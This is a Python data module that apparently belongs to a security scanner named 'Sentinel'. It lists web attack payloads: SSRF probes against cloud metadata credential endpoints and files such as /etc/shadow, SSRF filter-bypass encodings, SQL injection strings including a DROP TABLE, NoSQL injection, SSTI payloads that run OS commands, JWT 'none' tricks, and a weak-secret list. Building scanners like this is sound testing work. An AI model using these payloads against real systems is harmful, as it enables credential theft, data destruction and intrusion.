"""Static data for Sentinel modules — payloads, probes, signatures, and queries."""

from __future__ import annotations

from typing import Any, Callable, Dict, List

# ── SSRF cloud metadata probe targets ──────────────────────────────────────────

SSRF_PROBES: Dict[str, List[Dict[str, Any]]] = {
    "aws_imds_v1": [
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "indicator": ["meta-data", "iam"], "critical": True},
        {"url": "http://169.254.169.254/latest/meta-data/",
         "indicator": ["ami-id", "hostname"], "critical": False},
        {"url": "http://169.254.169.254/latest/user-data",
         "indicator": [], "critical": True},
    ],
    "aws_imds_v2": [
        {"url": "http://169.254.169.254/latest/api/token",
         "method": "PUT", "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
         "indicator": [], "critical": True},
    ],
    "azure_imds": [
        {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "headers": {"Metadata": "true"}, "indicator": ["subscriptionId", "resourceGroupName"], "critical": True},
        {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
         "headers": {"Metadata": "true"}, "indicator": ["access_token"], "critical": True},
    ],
    "gcp_metadata": [
        {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         "headers": {"Metadata-Flavor": "Google"}, "indicator": ["access_token"], "critical": True},
        {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
         "headers": {"Metadata-Flavor": "Google"}, "indicator": [], "critical": False},
    ],
    "kubernetes": [
        {"url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
         "headers": {"Authorization": "Bearer "}, "indicator": ["items", "apiVersion"], "critical": True},
    ],
    "internal_common": [
        {"url": "http://localhost/", "indicator": [], "critical": False},
        {"url": "http://127.0.0.1/", "indicator": [], "critical": False},
        {"url": "http://0.0.0.0/", "indicator": [], "critical": False},
        {"url": "http://[::1]/", "indicator": [], "critical": False},
        {"url": "http://10.0.0.1/", "indicator": [], "critical": False},
        {"url": "http://192.168.1.1/", "indicator": [], "critical": False},
        {"url": "file:///etc/passwd", "indicator": ["root:x:0"], "critical": True},
        {"url": "file:///etc/shadow", "indicator": ["root:"], "critical": True},
        {"url": "file:///proc/self/environ", "indicator": ["HOME=", "PATH="], "critical": True},
        {"url": "dict://localhost:6379/INFO", "indicator": ["redis_version"], "critical": True},
        {"url": "gopher://localhost:25/_EHLO", "indicator": ["ESMTP"], "critical": False},
    ],
}

SSRF_BYPASS_ENCODINGS: List[Callable[[str], str]] = [
    lambda u: u,
    lambda u: u.replace("169.254.169.254", "169.254.169.254.xip.io"),
    lambda u: u.replace("169.254.169.254", "0251.0376.0251.0376"),
    lambda u: u.replace("169.254.169.254", "0xa9fea9fe"),
    lambda u: u.replace("169.254.169.254", "2852039166"),
    lambda u: u.replace("169.254.169.254", "[::ffff:169.254.169.254]"),
    lambda u: u.replace("http://", "http://foo@").replace("169.254.169.254", "169.254.169.254"),
    lambda u: u.replace("http://", "hTTp://"),
    lambda u: u.replace("http://", "http:///"),
]

# ── SQL injection payloads ─────────────────────────────────────────────────────

SQLI_PAYLOADS_BASIC = [
    "'", '"', "' OR '1'='1", "' OR '1'='1'--", '" OR "1"="1',
    "1 OR 1=1", "1; DROP TABLE users--", "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "admin'--", "admin' #", "' OR 1=1--", "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--", "1 AND SLEEP(5)--", "'; SELECT pg_sleep(5)--",
]

SQLI_PAYLOADS_BLIND = [
    ("' AND SLEEP(5)--",            "mysql",      5.0),
    ("'; WAITFOR DELAY '0:0:5'--",  "mssql",      5.0),
    ("'; SELECT pg_sleep(5)--",     "postgres",   5.0),
    ("' AND 1=1--",                 "generic",    0.0),
    ("' AND 1=2--",                 "generic",    0.0),
]

# ── NoSQL injection payloads ──────────────────────────────────────────────────

NOSQL_PAYLOADS = [
    '{"$gt": ""}', '{"$ne": null}', '{"$exists": true}',
    '{"$regex": ".*"}', '{"$where": "1==1"}',
    '[$ne]=1', '[$gt]=', '[$regex]=.*',
    "' || '1'=='1", "'; return true; var x='",
]

# ── SSTI payloads ─────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{config}}", "Config"),
    ("{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", "uid="),
    ("{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}", "uid="),
    ("%{(#a=@org.apache.struts2.ServletActionContext@getResponse()).(#a.setHeader('X-SSTI','true'))}", "X-SSTI"),
]

# ── JWT constants ─────────────────────────────────────────────────────────────

JWT_NONE_ALGOS = ["none", "None", "NONE", "nOnE"]

COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "your-256-bit-secret",
    "supersecret", "mysecret", "changeme", "s3cr3t", "jwt-secret",
    "app_secret", "private_key", "secretkey", "jwttoken", "accesstoken",
]

# ── GraphQL queries ───────────────────────────────────────────────────────────

GRAPHQL_INTROSPECTION = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}
"""

GRAPHQL_INTROSPECTION_BYPASS = [
    "__schema{types{name,fields{name}}}",
    "{__typename}",
    '{ __type(name: "Query") { fields { name } } }',
]

# ── WAF signatures ────────────────────────────────────────────────────────────

WAF_SIGNATURES: Dict[str, List[str]] = {
    "Cloudflare":    ["cloudflare", "cf-ray", "__cfduid"],
    "AWS WAF":       ["x-amzn-requestid", "x-amzn-trace-id"],
    "Akamai":        ["akamai", "akamaierror"],
    "F5 BIG-IP":     ["bigipserver", "f5-csp"],
    "Incapsula":     ["incap_ses", "visid_incap"],
    "ModSecurity":   ["mod_security", "modsecurity"],
    "Sucuri":        ["sucuri-clientside"],
    "Barracuda":     ["barra_counter_session"],
    "DenyAll":       ["sessioncookie"],
}

# ── Common API paths ──────────────────────────────────────────────────────────

COMMON_API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/graphql", "/graphiql", "/playground",
    "/swagger", "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml", "/api-docs",
    "/.well-known/openid-configuration",
    "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
    "/metrics", "/health", "/status", "/ping",
    "/admin", "/admin/api", "/internal", "/debug",
    "/v1", "/v2", "/v3", "/rest", "/rpc",
]

# ── OAuth endpoints ───────────────────────────────────────────────────────────

OAUTH_ENDPOINTS = [
    "/.well-known/openid-configuration",
    "/oauth/token", "/oauth2/token", "/auth/token",
    "/connect/token", "/realms/master/protocol/openid-connect/token",
]
